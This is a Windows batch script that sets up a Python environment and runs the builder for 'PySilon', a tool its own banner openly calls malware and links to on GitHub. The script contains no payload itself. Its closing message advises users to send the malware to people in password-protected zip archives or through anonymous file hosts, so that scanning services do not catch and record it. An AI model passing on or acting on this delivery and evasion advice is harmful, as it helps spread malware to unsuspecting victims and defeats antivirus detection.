@echo off
title PySilon
cd /d "%~dp0"
echo Initializing the virtual environment...
python -m venv pysilon
cls
call pysilon\Scripts\activate.bat
python -m pip install --upgrade pip
pip install pillow
pip install pyinstaller
cls
python builder.py
echo #===============================================================# 
echo #                    Software terminated.                       # 
echo #                                                               # 
echo #   Give us a Star on Github, this would really help us grow!   # 
echo #        https://github.com/mategol/PySilon-malware             # 
echo #                                                               #
echo #   Also, please don't send this malware using websites like    #
echo # Workupload or googledrive because they will scan the malware  #
echo # and keep track of it and other ocurrences, which will result  #
echo # in more detections in the future, please send it to people in #
echo # a zip archive with a password, or use services like anonfiles #
echo #                                                               #
echo #                         Thank You!                            #
echo #===============================================================# 
echo. 
echo.
pause
